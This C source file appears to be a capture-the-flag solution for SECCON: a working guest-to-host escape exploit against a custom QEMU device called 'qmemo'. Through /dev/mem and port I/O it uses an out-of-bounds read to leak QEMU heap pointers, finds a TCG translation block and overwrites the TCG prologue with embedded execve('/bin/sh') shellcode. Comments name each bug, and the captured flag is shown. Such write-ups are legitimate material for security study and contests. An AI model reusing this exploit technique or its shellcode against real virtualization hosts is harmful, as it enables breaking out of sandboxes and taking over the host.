#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syscall.h>
#include <time.h>
#include <unistd.h>

static void __die_errno(const char *path, int line, const char *msg);

#define die_errno(msg) __die_errno(__FILE__, __LINE__, msg)

#define check_syscall(x)                                                       \
  ({                                                                           \
    typeof(x) __x = x;                                                         \
    if (__x == (typeof(x))-1) {                                                \
      die_errno(#x);                                                           \
    }                                                                          \
    __x;                                                                       \
  })

static void exec_shell(void) {
  char bin_sh[] = "/bin/sh";
  char *argv[] = {bin_sh, NULL};

  check_syscall(execve(argv[0], argv, environ));
}

static void __die_errno(const char *path, int line, const char *msg) {
  fprintf(stderr, "qmemo: %s:%d: ", path, line);
  perror(msg);
  exec_shell();
}

static void __die(const char *path, int line, const char *msg) {
  fprintf(stderr, "qmemo: %s:%d: %s\n", path, line, msg);
  exec_shell();
}

#define assert(x)                                                              \
  do {                                                                         \
    if (!(x)) {                                                                \
      __die(__FILE__, __LINE__, #x);                                           \
    }                                                                          \
  } while (0)

#define PAGE_SIZE 0x1000ULL
#define PIO_BASE 0xc030ULL
#define MMIO_BASE 0xfebd2000ULL
#define DATA_BASE 0x1000 /* let's hope we don't thrash important data */
#define DMA_MAPPING_ERROR -1
#define PORT_GET_RESULT 0
#define PORT_GET_INTFLAG 1
#define PORT_SET_COMMAND 0
#define PORT_DROP_IRQ 1
#define PORT_COUNT 2
#define CMD_STORE_GETKEY 0x10
#define CMD_STORE_PAGE 0x11
#define CMD_STORE_FIN 0x12
#define CMD_LOAD_SETKEY 0x20
#define CMD_LOAD_PAGE 0x21
#define CMD_LOAD_FIN 0x22
#define RESULT_COMPLETE 0x00
#define RESULT_INPROGRESS 0x01
#define RESULT_FAILED 0xff
#define INT_CMD (1 << 0)
#define INT_READ_FILE (1 << 1)
#define INT_WRITE_FILE (1 << 2)
#define INT_SDMA (1 << 3)
#define EVENT_COMPLETE (1 << 0)
#define EVENT_FAILED (1 << 1)
#define EVENT_FILE_IO (1 << 2)
#define EVENT_SDMA_DONE (1 << 3)
#define EVENT_CMD (EVENT_COMPLETE | EVENT_FAILED)
#define EVENT_ANY ((1 << 4) - 1)

struct reg_mmio {
  unsigned long sdma_addr;
  unsigned int key;
  union {
    unsigned int len;
    unsigned int pgoff;
  };
  /* max_access_size == 4 */
  unsigned int addr_ram_low;
};

static unsigned int store_getkey(struct reg_mmio *mmio, unsigned int len) {
  printf("qmemo: *** CMD_STORE_GETKEY\n");
  mmio->len = len;
  outb(CMD_STORE_GETKEY, PIO_BASE + PORT_SET_COMMAND);
  printf("qmemo: intflag = 0x%x\n", inb(PIO_BASE + PORT_GET_INTFLAG));
  printf("qmemo: result = 0x%x\n", inb(PIO_BASE + PORT_GET_RESULT));
  printf("qmemo: key = 0x%x\n", mmio->key);
  outb(0, PIO_BASE + PORT_DROP_IRQ);
  return mmio->key;
}

static void store_page(struct reg_mmio *mmio, unsigned long sdma_addr,
                       unsigned int pgoff) {
  printf("qmemo: *** CMD_STORE_PAGE\n");
  mmio->sdma_addr = sdma_addr;
  mmio->pgoff = pgoff;
  outb(CMD_STORE_PAGE, PIO_BASE + PORT_SET_COMMAND);
  printf("qmemo: intflag = 0x%x\n", inb(PIO_BASE + PORT_GET_INTFLAG));
  printf("qmemo: result = 0x%x\n", inb(PIO_BASE + PORT_GET_RESULT));
  outb(0, PIO_BASE + PORT_DROP_IRQ);
}

static void store_fin(void) {
  printf("qmemo: *** CMD_STORE_FIN\n");
  outb(CMD_STORE_FIN, PIO_BASE + PORT_SET_COMMAND);
  printf("qmemo: intflag = 0x%x\n", inb(PIO_BASE + PORT_GET_INTFLAG));
  printf("qmemo: result = 0x%x\n", inb(PIO_BASE + PORT_GET_RESULT));
  outb(0, PIO_BASE + PORT_DROP_IRQ);
}

static unsigned int load_setkey(struct reg_mmio *mmio, unsigned int key) {
  printf("qmemo: *** CMD_LOAD_SETKEY\n");
  mmio->key = key;
  outb(CMD_LOAD_SETKEY, PIO_BASE + PORT_SET_COMMAND);
  printf("qmemo: intflag = 0x%x\n", inb(PIO_BASE + PORT_GET_INTFLAG));
  printf("qmemo: result = 0x%x\n", inb(PIO_BASE + PORT_GET_RESULT));
  printf("qmemo: len = 0x%x\n", mmio->len);
  outb(0, PIO_BASE + PORT_DROP_IRQ);
  return mmio->len;
}

static bool load_page_verbose = false;

static unsigned int load_page(struct reg_mmio *mmio, unsigned long sdma_addr) {
  if (load_page_verbose) {
    printf("qmemo: *** CMD_LOAD_PAGE\n");
  }
  mmio->sdma_addr = sdma_addr;
  outb(CMD_LOAD_PAGE, PIO_BASE + PORT_SET_COMMAND);
  unsigned char intflag = inb(PIO_BASE + PORT_GET_INTFLAG);
  unsigned char result = inb(PIO_BASE + PORT_GET_RESULT);
  if (load_page_verbose || result == RESULT_FAILED) {
    printf("qmemo: intflag = 0x%x\n", intflag);
    printf("qmemo: result = 0x%x\n", result);
    printf("qmemo: pgoff = 0x%x\n", mmio->pgoff);
  }
  outb(0, PIO_BASE + PORT_DROP_IRQ);
  return mmio->pgoff;
}

static void load_fin(void) {
  printf("qmemo: *** CMD_LOAD_FIN\n");
  outb(CMD_LOAD_FIN, PIO_BASE + PORT_SET_COMMAND);
  printf("qmemo: intflag = 0x%x\n", inb(PIO_BASE + PORT_GET_INTFLAG));
  printf("qmemo: result = 0x%x\n", inb(PIO_BASE + PORT_GET_RESULT));
  outb(0, PIO_BASE + PORT_DROP_IRQ);
}

static bool is_mmap_pointer(unsigned long addr) {
  return (addr & 0xFFFFFF0000000000) == 0x7F0000000000;
}

struct tb_tc {
  unsigned long ptr;
  unsigned long size;
};

/* https://www.exploit-db.com/exploits/47008 */
static const unsigned char shellcode[] = "\x48\x31\xf6\x56\x48\xbf"
                                         "\x2f\x62\x69\x6e\x2f"
                                         "\x2f\x73\x68\x57\x54"
                                         "\x5f\xb0\x3b\x99\x0f\x05";
static const size_t sizeof_shellcode = 22;

int main(void) {
  int fd = check_syscall(open("/dev/mem", O_RDWR | O_SYNC));
  unsigned char *data = check_syscall(
      mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, DATA_BASE));
  struct reg_mmio *mmio = check_syscall(
      mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, MMIO_BASE));

  check_syscall(ioperm(PIO_BASE, PORT_COUNT, 1));

  /*
   * BUG: we can access 4 bytes past reg_mmio.
   */
  printf("qmemo: addr_ram_low = 0x%x\n", mmio->addr_ram_low);

  /* Attempt to clean up after the last try. */
  store_fin();
  load_fin();

  /*
   * BUG: CMD_LOAD_PAGE has no bounds checking.
   * Leak heap.
   */
  unsigned int key = store_getkey(mmio, 8);
  store_page(mmio, DMA_MAPPING_ERROR, 0xaabbccdd);
  store_fin();
  load_setkey(mmio, key);
  assert(load_page(mmio, DMA_MAPPING_ERROR) == 0xaabbccdd);
  load_page(mmio, DMA_MAPPING_ERROR);
  long heap[100];
  for (size_t i = 0; i < sizeof(heap) / sizeof(heap[0]); i++) {
    unsigned int low = load_page(mmio, DMA_MAPPING_ERROR);
    heap[i] = ((unsigned long)load_page(mmio, DMA_MAPPING_ERROR) << 32) | low;
  }

  /*
   * Find a pointer to
   *
   * struct tb_tc {
   *   const void *ptr;
   *   size_t size;
   * };
   *
   * on heap.
   */
  for (size_t i = 0; i < sizeof(heap) / sizeof(heap[0]); i++) {
    if (!is_mmap_pointer(heap[i])) {
      continue;
    }
    printf("qmemo: heap: 0x%lx\n", heap[i]);
    mmio->addr_ram_low = heap[i] & 0xffffffff;
    load_page(mmio, DATA_BASE);
    struct tb_tc *tc = (struct tb_tc *)data;
    if (is_mmap_pointer(tc->ptr) && tc->size > 0 && tc->size < 0x1000) {
      printf("qmemo: tc ptr=0x%lx size=0x%lx\n", tc->ptr, tc->size);
      /*
       * tc_ptr points to:
       *
       *    0x7f93e8bb5300:    mov    ebx,DWORD PTR [rbp-0x10]
       *    0x7f93e8bb5303:    test   ebx,ebx
       *    0x7f93e8bb5305:    jl     0x7f93e8bb54ec
       *
       *    0x7f93e8bb5300:    0x8b    0x5d    0xf0    0x85
       *                       0xdb    0x0f    0x8c    0xe1
       *    0x7f93e8bb5308:    0x01    0x00    0x00
       *
       *    ...
       *    0x7f93e8bb54ec:    lea    rax,[rip+0xfffffffffffffd50]
       *    0x7f93e8bb54f3:    jmp    0x7f93e8000018
       *
       * The last instruction jumps to the second half of the TCG prologue.
       * Overwrite it with shellcode.
       */
      unsigned long tc_ptr = tc->ptr;
      mmio->addr_ram_low = tc_ptr & 0xffffffff;
      load_page(mmio, DATA_BASE);
      if (data[0] == 0x8b && data[1] == 0x5d && data[2] == 0xf0 &&
          data[3] == 0x85 && data[4] == 0xdb && data[5] == 0x0f &&
          data[6] == 0x8c) {
        printf("qmemo: tb starts with mov/test/jl\n");
        int delta = *(int *)&data[7];
        printf("qmemo: delta = %d\n", delta);
        int delta_prologue = *(int *)&data[11 + delta + 8];
        printf("qmemo: delta_prologue = %d\n", delta_prologue);
        unsigned long prologue = tc_ptr + 11 + delta + 12 + delta_prologue;
        printf("qmemo: prologue = 0x%lx\n", prologue);
        load_fin();
        store_getkey(mmio, 8);
        mmio->addr_ram_low = prologue & 0xffffffff;
        memcpy(data, shellcode, sizeof_shellcode);
        store_page(mmio, DATA_BASE, 0);
        /*
         * $ cat flag-5cdb18a33c4a2f99c072373d87928992.txt
         * SECCON{q3mu_15_4_k1nd_0f_54ndb0x.....r1gh7?}
         */
        store_fin();
        return EXIT_SUCCESS;
      }
    }
  }

  load_fin();
  return EXIT_FAILURE;
}
